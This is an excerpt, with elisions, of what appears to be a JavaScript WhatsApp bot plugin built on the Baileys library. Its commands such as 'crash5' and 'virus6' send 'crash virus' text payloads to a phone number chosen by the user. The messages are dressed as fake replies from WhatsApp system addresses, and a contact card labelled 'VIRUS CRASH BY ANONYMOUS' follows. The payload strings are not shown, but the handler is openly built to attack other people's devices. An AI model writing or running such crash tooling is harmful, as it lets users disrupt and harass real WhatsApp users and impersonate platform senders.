...
const {prepareWAMessageMedia, proto, generateWAMessageFromContent, getLastMessageInChat} = (await import('@whiskeysockets/baileys')).default;

const handler = async (m, {conn, args, text, command, usedPrefix, participants}) => {
  let from;
  if (text) from = `${text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'}`;
  if (!text) from = `${m.chat}`;
  if (text && isNaN(text)) throw 'https://github.com/jayden-official *[❗𝐈𝐍𝐅𝐎❗] THE TEXT MUST BE A NUMBER, TO WHICH THE CRASH VIRUD WILL BE SENT*';

  let send;
  if (text) send = `@${text.replace(/[^0-9]/g, '')}`;
  if (!text) send = `https://github.com/jayden-official IT'S CHAT`;
  ...
  switch (command) {
    ...
    case 'virus5': case 'c5': case 'binario5': case 'traba5': case 'crash5': {
      conn.fakeReply(from, virtex6, '0@s.whatsapp.net', '🔥 *By Anonymous bot* 🔥', 'status@broadcast');
      conn.fakeReply(from, virtex7, '0@s.whatsapp.net', '🔥 *By Anonymous bot* 🔥', 'status@broadcast');
      conn.fakeReply(from, virtex8, '0@s.whatsapp.net', '🔥 *By Anonymous bot* 🔥', 'status@broadcast');}
      break;
    case 'virus6': case 'c6': case 'binario6': case 'traba6': case 'crash6': {
      ...
      await conn.sendContact(from, '🔥 VIRUS CRASH BY ANONYMOUS 🔥', fkontaak);}
      break;
